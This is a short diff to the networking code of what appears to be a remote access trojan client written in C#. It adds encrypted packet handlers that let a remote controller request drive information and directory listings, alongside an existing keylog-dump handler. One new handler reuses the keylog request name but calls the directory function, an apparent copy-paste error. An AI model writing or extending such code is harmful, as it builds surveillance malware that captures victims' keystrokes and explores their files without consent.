@@ -121,6 +121,14 @@ namespace Client.Core.Networking
             {
                 GetKeylogDumpLength.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("GetDriveInfoReq", (packetHeader, connection, incomingData) =>
+            {
+                GetDriveInfo.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("GetKeylogDumpLengthReq", (packetHeader, connection, incomingData) =>
+            {
+                GetDirectorContent.Execute(Cryptography.Decrypt(incomingData));
+            });
 
         }
 
